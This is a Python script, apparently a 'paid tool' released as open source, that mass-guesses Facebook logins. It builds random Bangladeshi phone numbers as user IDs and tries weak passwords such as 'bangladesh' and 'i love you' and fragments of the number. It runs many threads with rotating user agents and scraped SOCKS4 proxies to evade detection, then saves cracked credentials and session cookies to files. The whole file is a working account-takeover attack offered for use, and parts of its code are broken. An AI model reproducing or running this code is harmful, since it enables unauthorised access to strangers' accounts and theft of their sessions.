#Samir /Snighdo Paid Tools open source 
#Follow Mursalin Ahamed Khan Alin On Facebook 
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def saiya():
    os.system('clear')
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;35m[1] RANDOM UID CLONE \033[1;33m[BANGLADESH]')
    print('\033[1;37m[2] CONTACT THIS TOOLS OWNER')
    print('\033[1;37m[0] EXIT')
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    opt = input('\033[1;37m[√] CHOOSE : ')
    if opt == '1':
        menu()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100083031805155&mibextid=ZbWKwL')
        return None
    if None == '0':
        os.system('exit')
        return None

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
    


def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class slower:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.11)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;92m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

def cek_apks(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r%s {P}[%s•%s] %sActive Apks & Web Not Found%s         '%(N,U,N,B,N))
    else:
        print(f'\r\r {G}[•] Your Active Apks & Web 👇{G}       ')
        for i in range(len(game)):
            print(f"\r\r {G}[%s] %s %s"%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r%s [%s•%s] %sExpired Apks & Web Not Found%s                '%(N,M,N,M,N))
    else:
        print(f'\r\r [{M}•{P}]{M} Expired Apks & Web 👇{P}')
        for i in range(len(game)):
            print(f"\r\r {K}[%s]{K} %s %s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

logo =("""\033[1;32m
.88b  d88. d8888b.    .d8888.  .d8b.  .88b  d88. d888888b d8888b. 
88'YbdP`88 88  `8D    88'  YP d8' `8b 88'YbdP`88   `88'   88  `8D 
88  88  88 88oobY'    `8bo.   88ooo88 88  88  88    88    88oobY' 
88  88  88 88`8b        `Y8b. 88~~~88 88  88  88    88    88`8b   
88  88  88 88 `88. db db   8D 88   88 88  88  88   .88.   88 `88. 
YP  YP  YP 88   YD VP `8888Y' YP   YP YP  YP  YP Y888888P 88   YD 
                                                                                                                                    
       ┌━━━━━━━━━━━━━━━━━ SAMIR ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  SADMAN SAMIR SNIGDHO            
               \033[1;91mFACEBOK      :  SNIGDHO AFRIDI              
               \033[1;97mGITHUB       :  SAMIR-CYBER-143       
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  NO                 
               \033[1;91mTOOL VIRSION :  2.00                    
               \033[1;97mTOOL WORK    :   DATA & WIFI          
      \033[1;32m └━━━━━━━━━━━━━━━━━ CYBER-143 ━━━━━━━━━━━━━━━━┘""")
loop = 0
oks = []
cps = []
def linex():
    print('\033[1;37m--------------------------------------------')

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
uas=[] 
user=[]
twf =[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
	  print('WELCOME TO SAMIR-CYBER-143 TOOLS🔥')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)        

def menu():
    clear()
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\33[1;96m[1] 8 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mFAST\033[38;5;196m]')
    print('\33[1;96m[2] 7 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mFAST\033[38;5;196m]')
    print('\33[1;96m[3] 6 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mFAST\033[38;5;196m]')
    print('\33[1;96m[4] 8 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mULTRA\033[38;5;196m]')
    print('\33[1;96m[5] 7 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mULTRA\033[38;5;196m]')
    print('\33[1;96m[6] 6 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mULTRA\033[38;5;196m]')
    print('\33[1;96m[7] MAX🔥ID CLONE BD\033[38;5;196m[\033[38;5;46mSLOW\033[38;5;196m]')
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    linex()
    mtd=input('\033[1;37m[✓] CHOOSE :')
    if mtd in '1':
        ak()
    if mtd in '2':
        ak1()
    if mtd in '3':
        ak2()
    if mtd in '4':
        ak3()
    if mtd in '5':
        ak4()
    if mtd in '6':
        ak5()
    if mtd in '7':
        ak6()
    
    


def ak():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            pwx = [love,'bangladesh','i love you']
            setu.submit(rcrack,uid,pwx,tl)
            



def ak1():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:7]
            lb=uid[0:7]
            pwx = [bl,lb,'bangladesh']
            setu.submit(rcrack,uid,pwx,tl)



def ak2():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] YOUR CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:6]
            lb=uid[0:6]
            pwx = [bl,lb,'bangladesh']
            setu.submit(rcrack,uid,pwx,tl)




def ak3():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] YOUR CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            pwx = [love,'bangladesh','i love you','09876543']
            setu.submit(bcrack,uid,pwx,tl)



def ak4():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] YOUR CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:7]
            lb=uid[0:7]
            pwx = [bl,lb,'bangladesh','i love you']
            setu.submit(bcrack,uid,pwx,tl)

def ak5():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] YOUR CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:6]
            lb=uid[0:6]
            pwx = [bl,lb,'bangladesh','i love you']
            setu.submit(bcrack,uid,pwx,tl)

def ak6():
    os.system("clear")
    print(logo)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print('\033[1;37m[✓] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[✓] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] ENTER YOUR  CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[🔥] YOUR SIM CODE  : '+code)
        print('\033[1;37m[🔥] YOUR CRACK ID LIMIT  : '+tl)
        slower('\033[1;37m[🔥] CRACKING STARTED......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[0:6]
            lb=uid[:6]
            kb=uid[0:7]
            bk=uid[:7]
            pwx = [love,bl,lb,kb,bk,uid,'bangladesh','i love you']
            setu.submit(bcrack,uid,pwx,tl)







def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m[SAMIR\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="99", "Not)A;Brand";v="99", "Chromium";v="99"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[SAMIR-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/SAMIR-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[SAMIR-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/SAMIR-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

def bcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m[SAMIR\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'mbasic.facebook.com',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            'method': 'path',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
            'dnt':'1', 
            'x-requested-with':'mark.via.gp', 
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            "sec-ch-prefers-color-scheme": "light",
            'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[SAMIR-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE 🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/SAMIR-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[SAMIR-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/SAMIR-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

saiya()
